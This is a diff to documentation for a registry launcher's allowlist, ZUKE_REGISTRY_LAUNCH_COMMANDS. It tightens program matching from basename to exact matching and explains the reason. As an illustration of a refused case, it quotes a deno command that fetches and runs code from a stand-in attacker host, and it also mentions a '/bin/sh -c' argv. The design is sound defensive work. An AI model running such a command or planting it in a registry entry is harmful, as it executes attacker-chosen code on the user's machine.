@@ -71,16 +71,19 @@ The **location** is one of two forms:
 > which is what `zuke register` writes, are unaffected.
 >
 > **A `command` location is refused the same way**, unless its program is named
-> in `ZUKE_REGISTRY_LAUNCH_COMMANDS` (same spelling; `*` allows any). Its argv is
-> not code already on the machine the way a local module path is — the registry
-> writer picks the program _and its arguments_, so `["deno", "run", "-A",
-> "https://attacker.example/x.ts"]` is the refused module case in command form
-> and `["/bin/sh", "-c", …]` is arbitrary code with no fetch. The entry matches
-> `command[0]` as written or by its trailing path segment (`make` admits
-> `/usr/bin/make`; `/usr/bin/make` admits only itself). Naming a bare program
-> admits any program resolving under that name, and naming an interpreter hands
-> the registry writer full execution — both are the operator's decision to make.
-> A refusal is an audited `launch_command_not_allowed` event.
+> in `ZUKE_REGISTRY_LAUNCH_COMMANDS` (comma-separated, since a program path may
+> contain a space; `*` allows any). Its argv is not code already on the machine
+> the way a local module path is — the registry writer picks the program _and its
+> arguments_, so `["deno", "run", "-A", "https://attacker.example/x.ts"]` is the
+> refused module case in command form and `["/bin/sh", "-c", …]` is arbitrary
+> code with no fetch. The entry must match `command[0]` **exactly**, case-folded,
+> and deliberately not by basename: the descriptor chooses the program string, so
+> matching `make` against `/tmp/anywhere/make` would point a trusted name at a
+> file of the writer's own. A refusal names the exact string to add. A
+> **relative** program resolves against the descriptor's own working directory,
+> which the same writer chooses, so prefer an absolute path; and listing an
+> interpreter hands the registry writer full execution, since the arguments are
+> theirs. A refusal is an audited `launch_command_not_allowed` event.
 
 ## Backends
 
